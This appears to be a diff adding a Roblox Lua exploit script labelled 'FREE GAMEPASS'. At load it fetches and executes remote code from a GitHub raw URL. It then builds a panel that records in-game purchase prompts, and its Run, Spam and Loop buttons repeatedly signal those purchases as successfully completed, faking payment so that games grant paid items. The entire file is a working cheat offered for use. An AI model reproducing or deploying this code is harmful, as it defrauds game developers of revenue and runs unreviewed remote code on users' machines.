@@ -1,0 +1,652 @@
+local userInputService = game:GetService("UserInputService")
+local marketplaceService = game:GetService("MarketplaceService")
+local players = game:GetService("Players")
+local tweenService = game:GetService("TweenService")
+
+pcall(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/giobolqvi1/notification-/refs/heads/main/notification"))()
+end)
+
+local localPlayer = players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+if playerGui:FindFirstChild("SeluwiaUI") then
+  playerGui.SeluwiaUI:Destroy()
+end
+
+local seluwiaUI = Instance.new("ScreenGui")
+seluwiaUI.Name = "SeluwiaUI"
+seluwiaUI.ResetOnSpawn = false
+seluwiaUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+seluwiaUI.IgnoreGuiInset = true
+seluwiaUI.Parent = playerGui
+
+local touchEnabled = userInputService.TouchEnabled
+
+local function makeCorner(p1, p2)
+  local instance = Instance.new("UICorner", p1)
+  instance.CornerRadius = UDim.new(0, p2 or 0)
+  return instance
+end
+
+local function makeStroke(p3, color, thickness)
+  local instance2 = Instance.new("UIStroke", p3)
+  instance2.Color = color or Color3.fromRGB(255, 255, 255)
+  instance2.Thickness = thickness or 1
+
+  return instance2
+end
+
+local v1 = touchEnabled and 180 or 200
+local udim = UDim2.new(0, v1, 0, v1)
+local v2 = touchEnabled and 0.8 or 1
+local v3 = touchEnabled and 24 or 20
+local v4 = touchEnabled and 28 or 30
+local v5 = touchEnabled and 28 or 30
+
+local panel = Instance.new("Frame")
+panel.Name = "Panel"
+panel.Size = udim
+panel.Position = UDim2.new(1, -v1 - 20, 0.5, -v1 / 2)
+panel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+panel.BorderSizePixel = 0
+panel.Parent = seluwiaUI
+
+makeCorner(panel, 8)
+makeStroke(panel, Color3.fromRGB(120, 120, 120), 1)
+local position, position2
+
+local function f1(input)
+  local v6 = input.Position - position
+
+  panel.Position = UDim2.new(
+    position2.X.Scale, position2.X.Offset + v6.X, position2.Y.Scale, position2.Y.Offset + v6.Y
+  )
+end
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, v4)
+titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = panel
+
+makeCorner(titleBar, 8)
+makeStroke(titleBar, Color3.fromRGB(60, 60, 60), 1)
+local v7
+
+titleBar.InputBegan:Connect(function(input2)
+  if input2.UserInputType == Enum.UserInputType.MouseButton1
+    or input2.UserInputType == Enum.UserInputType.Touch then
+    v7 = true
+    position = input2.Position
+    position2 = panel.Position
+
+    input2.Changed:Connect(function()
+      if input2.UserInputState == Enum.UserInputState.End then
+        v7 = false
+      end
+    end)
+  end
+end)
+
+local v8
+
+titleBar.InputChanged:Connect(function(input3)
+  if input3.UserInputType == Enum.UserInputType.MouseMovement
+    or input3.UserInputType == Enum.UserInputType.Touch then
+    v8 = input3
+  end
+end)
+
+userInputService.InputChanged:Connect(function(input4)
+  if input4 == v8 and v7 then
+    f1(input4)
+  end
+end)
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, -60, 1, 0)
+textLabel.Position = UDim2.new(0, 8, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "FREE GAMEPASS"
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextSize = 11 * v2
+textLabel.Font = Enum.Font.Fantasy
+textLabel.TextXAlignment = Enum.TextXAlignment.Left
+textLabel.ZIndex = titleBar.ZIndex + 2
+textLabel.Parent = titleBar
+
+local textButton = Instance.new("TextButton")
+textButton.Size = UDim2.new(0, 45, 0, v4 - 6)
+textButton.Position = UDim2.new(1, -50, 0.5, -(v4 - 6) / 2)
+textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textButton.Text = "Clear"
+textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+textButton.TextSize = 10 * v2
+textButton.Font = Enum.Font.Fantasy
+textButton.BorderSizePixel = 0
+textButton.ZIndex = titleBar.ZIndex + 3
+textButton.Parent = titleBar
+
+makeCorner(textButton, 4)
+makeStroke(textButton, Color3.fromRGB(60, 60, 60), 1)
+
+textButton.MouseEnter:Connect(function()
+  textButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+  textButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+end)
+
+textButton.MouseLeave:Connect(function()
+  textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+
+local logArea = Instance.new("ScrollingFrame")
+logArea.Name = "LogArea"
+logArea.Size = UDim2.new(1, -8, 1, -(v4 + v5 + 10))
+logArea.Position = UDim2.new(0, 4, 0, v4 + 4)
+logArea.BackgroundTransparency = 1
+logArea.BorderSizePixel = 0
+logArea.ScrollBarThickness = 2
+logArea.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
+logArea.CanvasSize = UDim2.new(0, 0, 0, 0)
+logArea.AutomaticCanvasSize = Enum.AutomaticSize.Y
+logArea.Parent = panel
+
+local instance3 = Instance.new("UIListLayout", logArea)
+instance3.SortOrder = Enum.SortOrder.LayoutOrder
+instance3.Padding = UDim.new(0, 4)
+instance3.VerticalAlignment = Enum.VerticalAlignment.Top
+
+local instance4 = Instance.new("UIPadding", logArea)
+instance4.PaddingTop = UDim.new(0, 4)
+
+local map, map2
+
+local function f2()
+  for key, value in pairs(map) do
+    value.active = false
+
+    if value.loop then
+      task.cancel(value.loop)
+    end
+
+    if key and key.Parent then
+      key.Text = "Loop"
+      key.TextColor3 = Color3.fromRGB(255, 255, 255)
+      key.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    end
+  end
+
+  table.clear(map)
+
+  for key2, value2 in pairs(map2) do
+    value2.active = false
+
+    if value2.loop then
+      task.cancel(value2.loop)
+    end
+
+    if key2 and key2.Parent then
+      key2.Text = "Run"
+      key2.TextColor3 = Color3.fromRGB(255, 255, 255)
+      key2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    end
+  end
+
+  table.clear(map2)
+end
+
+instance4.PaddingBottom = UDim.new(0, 4)
+instance4.PaddingLeft = UDim.new(0, 2)
+instance4.PaddingRight = UDim.new(0, 2)
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 0, v5)
+frame.Position = UDim2.new(0, 0, 1, -v5)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = panel
+
+makeCorner(frame, 8)
+makeStroke(frame, Color3.fromRGB(60, 60, 60), 1)
+
+local textLabel2 = Instance.new("TextLabel")
+textLabel2.Size = UDim2.new(1, -16, 1, 0)
+textLabel2.Position = UDim2.new(0, 8, 0, 0)
+textLabel2.BackgroundTransparency = 1
+textLabel2.Text = "0 events"
+textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel2.TextSize = 10 * v2
+textLabel2.Font = Enum.Font.Fantasy
+textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+textLabel2.ZIndex = frame.ZIndex + 1
+textLabel2.Parent = frame
+
+local guiToggleBtn = Instance.new("TextButton")
+guiToggleBtn.Name = "GuiToggleBtn"
+guiToggleBtn.Size = UDim2.new(0, 50, 0, 24)
+guiToggleBtn.Position = UDim2.new(1, -v1 - 20, 0.5, v1 / 2 + 10)
+guiToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+guiToggleBtn.Text = "gui"
+guiToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+guiToggleBtn.TextSize = 11
+guiToggleBtn.Font = Enum.Font.Fantasy
+guiToggleBtn.BorderSizePixel = 0
+guiToggleBtn.ZIndex = 100
+guiToggleBtn.Parent = seluwiaUI
+
+makeCorner(guiToggleBtn, 4)
+makeStroke(guiToggleBtn, Color3.fromRGB(120, 120, 120), 1)
+local position3, position4
+
+local function f3(input5)
+  local v9 = input5.Position - position3
+
+  guiToggleBtn.Position = UDim2.new(
+    position4.X.Scale, position4.X.Offset + v9.X, position4.Y.Scale, position4.Y.Offset + v9.Y
+  )
+end
+
+local v10
+
+guiToggleBtn.InputBegan:Connect(function(input6)
+  if input6.UserInputType == Enum.UserInputType.MouseButton1
+    or input6.UserInputType == Enum.UserInputType.Touch then
+    v10 = true
+    position3 = input6.Position
+    position4 = guiToggleBtn.Position
+
+    input6.Changed:Connect(function()
+      if input6.UserInputState == Enum.UserInputState.End then
+        v10 = false
+      end
+    end)
+  end
+end)
+
+local inputChanged = guiToggleBtn.InputChanged
+local v11
+
+inputChanged:Connect(function(p4)
+  if p4.UserInputType == Enum.UserInputType.MouseMovement
+    or p4.UserInputType == Enum.UserInputType.Touch then
+    v11 = p4
+  end
+end)
+
+userInputService.InputChanged:Connect(function(input7)
+  if input7 == v11 and v10 then
+    f3(input7)
+  end
+end)
+
+guiToggleBtn.MouseButton1Click:Connect(function() panel.Visible = not panel.Visible end)
+
+local function makeTextLabel()
+  local emptyState = Instance.new("TextLabel")
+  emptyState.Name = "EmptyState"
+  emptyState.Size = UDim2.new(1, 0, 0, 60)
+  emptyState.BackgroundTransparency = 1
+  emptyState.Text = "Waiting..."
+  emptyState.TextColor3 = Color3.fromRGB(255, 255, 255)
+  emptyState.TextSize = 11 * v2
+  emptyState.Font = Enum.Font.Fantasy
+  emptyState.TextWrapped = true
+  emptyState.LayoutOrder = 99999
+  emptyState.Parent = logArea
+
+  return emptyState
+end
+
+local v12 = 0
+local list = {}
+local v13 = {}
+local f4
+
+local function f5(p5, p6)
+  local v14 = f4(p5, p6)
+  v13[v14] = (v13[v14] or 0) + 1
+
+  pcall(function()
+    if p5 == "Product" then
+      marketplaceService:SignalPromptProductPurchaseFinished(localPlayer.UserId, p6, true)
+    elseif p5 == "Gamepass" then
+      marketplaceService:SignalPromptGamePassPurchaseFinished(localPlayer, p6, true)
+    elseif p5 == "Bulk" then
+      marketplaceService:SignalPromptBulkPurchaseFinished(localPlayer.UserId, p6, true)
+    elseif p5 == "Purchase" then
+      marketplaceService:SignalPromptPurchaseFinished(localPlayer.UserId, p6, true)
+    end
+  end)
+
+  task.defer(function()
+    v13[v14] = v13[v14] - 1
+
+    if v13[v14] <= 0 then
+      v13[v14] = nil
+    end
+  end)
+end
+
+function f4(p7, p8)
+  return p7 .. "_" .. tostring(p8)
+end
+
+local function f6(p9, p10)
+  return (v13[f4(p9, p10)] or 0) > 0
+end
+
+local f7
+
+local function makeTextButton(text, text2, p11)
+  if f6(p11, text2) then
+    return
+  end
+
+  f7(false)
+
+  local frame2 = Instance.new("Frame")
+  frame2.Size = UDim2.new(1, -2, 0, touchEnabled and 32 or 28)
+  frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  frame2.BorderSizePixel = 0
+  frame2.LayoutOrder = -v12
+  frame2.Parent = logArea
+
+  makeCorner(frame2, 4)
+  makeStroke(frame2, Color3.fromRGB(60, 60, 60), 1)
+
+  local textLabel3 = Instance.new("TextLabel")
+  textLabel3.Size = UDim2.new(0, 35, 1, 0)
+  textLabel3.Position = UDim2.new(0, 4, 0, 0)
+  textLabel3.BackgroundTransparency = 1
+  textLabel3.Text = string.sub(string.upper(text), 1, 4)
+  textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+  textLabel3.TextSize = 9 * v2
+  textLabel3.Font = Enum.Font.Fantasy
+  textLabel3.TextXAlignment = Enum.TextXAlignment.Left
+  textLabel3.Parent = frame2
+
+  local textLabel4 = Instance.new("TextLabel")
+  textLabel4.Size = UDim2.new(0, 45, 1, 0)
+  textLabel4.Position = UDim2.new(0, 42, 0, 0)
+  textLabel4.BackgroundTransparency = 1
+  textLabel4.Text = tostring(text2)
+  textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
+  textLabel4.TextSize = 10 * v2
+  textLabel4.Font = Enum.Font.Fantasy
+  textLabel4.TextXAlignment = Enum.TextXAlignment.Left
+  textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
+  textLabel4.Parent = frame2
+
+  local frame3 = Instance.new("Frame")
+  frame3.Size = UDim2.new(0, 68, 1, 0)
+  frame3.Position = UDim2.new(1, -68, 0, 0)
+  frame3.BackgroundTransparency = 1
+  frame3.Parent = frame2
+
+  local textButton2 = Instance.new("TextButton")
+  textButton2.Size = UDim2.new(0, 31, 0, v3)
+  textButton2.Position = UDim2.new(0, 2, 0.5, -v3 / 2)
+  textButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  textButton2.Text = "Run"
+  textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+  textButton2.TextSize = 8 * v2
+  textButton2.Font = Enum.Font.Fantasy
+  textButton2.BorderSizePixel = 0
+  textButton2.Parent = frame3
+
+  makeCorner(textButton2, 4)
+  makeStroke(textButton2, Color3.fromRGB(60, 60, 60), 1)
+
+  local textButton3 = Instance.new("TextButton")
+  textButton3.Size = UDim2.new(0, 31, 0, v3)
+  textButton3.Position = UDim2.new(0, 35, 0.5, -v3 / 2)
+  textButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+  textButton3.Text = "Loop"
+  textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+  textButton3.TextSize = 8 * v2
+  textButton3.Font = Enum.Font.Fantasy
+  textButton3.BorderSizePixel = 0
+  textButton3.Parent = frame3
+
+  makeCorner(textButton3, 4)
+  makeStroke(textButton3, Color3.fromRGB(60, 60, 60), 1)
+  local v15
+  local v16
+  local v17
+  local flag = false
+
+  local function f8()
+    if flag then
+      return
+    end
+
+    flag = true
+    textButton2.Text = "Spam"
+
+    v17 = task.spawn(function()
+      while flag and textButton2.Parent do
+        f5(p11, text2)
+        task.wait(0.1)
+      end
+    end)
+
+    map2[textButton2] = { active = true, loop = v17 }
+  end
+
+  local function f9()
+    flag = false
+
+    if v17 then
+      task.cancel(v17)
+    end
+
+    map2[textButton2] = nil
+
+    if textButton2.Parent then
+      textButton2.Text = "Run"
+      textButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+      textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+  end
+
+  local function f10()
+    if flag then
+      return
+    end
+
+    v15 = tick()
+
+    v16 = task.spawn(function()
+      while v15 and tick() - v15 < 3 do
+        task.wait(0.1)
+      end
+
+      if v15 and not flag then
+        f8()
+      end
+    end)
+  end
+
+  local function f11()
+    local v18 = v15 and tick() - v15 or 0
+    v15 = nil
+
+    if v16 then
+      task.cancel(v16)
+    end
+
+    if flag then
+      f9()
+    elseif v18 < 3 then
+      f5(p11, text2)
+    end
+  end
+
+  textButton2.InputBegan:Connect(function(input8)
+    if input8.UserInputType == Enum.UserInputType.MouseButton1
+      or input8.UserInputType == Enum.UserInputType.Touch then
+      f10()
+    end
+  end)
+
+  textButton2.InputEnded:Connect(function(input9)
+    if input9.UserInputType == Enum.UserInputType.MouseButton1
+      or input9.UserInputType == Enum.UserInputType.Touch then
+      f11()
+    end
+  end)
+
+  textButton2.MouseEnter:Connect(function()
+    if not flag then
+      textButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+      textButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
+    end
+  end)
+
+  textButton2.MouseLeave:Connect(function()
+    if not flag and textButton2.Text == "Run" then
+      textButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+      textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+  end)
+
+  local flag2 = false
+  local v19
+
+  local function f12()
+    flag2 = false
+
+    if v19 then
+      task.cancel(v19)
+    end
+
+    map[textButton3] = nil
+
+    if textButton3.Parent then
+      textButton3.Text = "Loop"
+      textButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+      textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+  end
+
+  local function f13()
+    flag2 = true
+
+    textButton3.Text = "Stop"
+    textButton3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    v19 = task.spawn(function()
+      while flag2 and textButton3.Parent do
+        f5(p11, text2)
+        task.wait(0.01)
+      end
+    end)
+
+    map[textButton3] = { active = true, loop = v19 }
+  end
+
+  textButton3.MouseButton1Click:Connect(function()
+    if flag2 then
+      f12()
+    else
+      f13()
+    end
+  end)
+
+  textButton3.MouseEnter:Connect(function()
+    if not flag2 then
+      textButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+      textButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+    end
+  end)
+
+  textButton3.MouseLeave:Connect(function()
+    if not flag2 then
+      textButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+      textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+  end)
+
+  frame2.AncestryChanged:Connect(function()
+    if not frame2.Parent then
+      if flag then
+        f9()
+      end
+
+      if flag2 then
+        f12()
+      end
+
+      for index, value3 in ipairs(list) do
+        if value3 == frame2 then
+          table.remove(list, index)
+          break
+        end
+      end
+
+      if #list == 0 then
+        f7(true)
+      end
+    end
+  end)
+
+  v12 = v12 + 1
+  textLabel2.Text = v12 .. " events"
+  table.insert(list, frame2)
+end
+
+function f7(p12)
+  local emptyState2 = logArea:FindFirstChild("EmptyState")
+
+  if p12 and not emptyState2 then
+    makeTextLabel()
+  elseif not p12 and emptyState2 then
+    emptyState2:Destroy()
+  end
+end
+
+map = {}
+map2 = {}
+
+textButton.MouseButton1Click:Connect(function()
+  f2()
+
+  for _, value4 in ipairs(list) do
+    value4:Destroy()
+  end
+
+  list = {}
+  v12 = 0
+  textLabel2.Text = "0 events"
+  f7(true)
+end)
+
+marketplaceService.PromptProductPurchaseFinished:Connect(function(_, p13, p14)
+  if not f6("Product", p13) then
+    makeTextButton("Product", p13, "Product")
+  end
+end)
+
+marketplaceService.PromptGamePassPurchaseFinished:Connect(function(_, p15, p16)
+  if not f6("Gamepass", p15) then
+    makeTextButton("Gamepass", p15, "Gamepass")
+  end
+end)
+
+marketplaceService.PromptBulkPurchaseFinished:Connect(function(_, p17, p18)
+  if not f6("Bulk", p17) then
+    makeTextButton("Bulk", p17, "Bulk")
+  end
+end)
+
+marketplaceService.PromptPurchaseFinished:Connect(function(_, p19, p20)
+  if not f6("Purchase", p19) then
+    makeTextButton("Purchase", p19, "Purchase")
+  end
+end)
+
+f7(true)
